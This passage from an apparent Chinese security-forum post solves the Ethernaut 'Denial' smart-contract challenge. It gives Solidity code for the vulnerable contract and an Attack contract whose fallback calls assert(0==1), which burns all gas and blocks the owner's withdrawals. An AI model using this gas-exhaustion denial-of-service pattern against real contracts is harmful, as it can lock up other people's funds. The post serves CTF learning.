
![image.png](https://bbs.kanxue.com/upload/attach/202005/837755_Y8K3E5KXUKE822M.jpg "image.png")

还有一种方法是 `assert` 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了

```
pragma solidity ^0.4.23;

contract Denial {

    address public partner;

    address public constant owner = 0xA9E;

    uint timeLastWithdrawn;

    mapping(address => uint) withdrawPartnerBalances; 

    function setWithdrawPartner(address _partner) public {

        partner = _partner;

    }

    function withdraw() public {

        uint amountToSend = address(this).balance/100;

        partner.call.value(amountToSend)();

        owner.transfer(amountToSend);

        timeLastWithdrawn = now;

        withdrawPartnerBalances[partner] += amountToSend;

    }

    function() payable {}

    function contractBalance() view returns (uint) {

        return address(this).balance;

    }

}

contract Attack{

    address instance_address = 题目合约地址;

    Denial target = Denial(instance_address);

    function hack() public {

        target.setWithdrawPartner(address(this));

        target.withdraw();

    }

    function () payable public {

        assert(0==1);

    }

}
```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
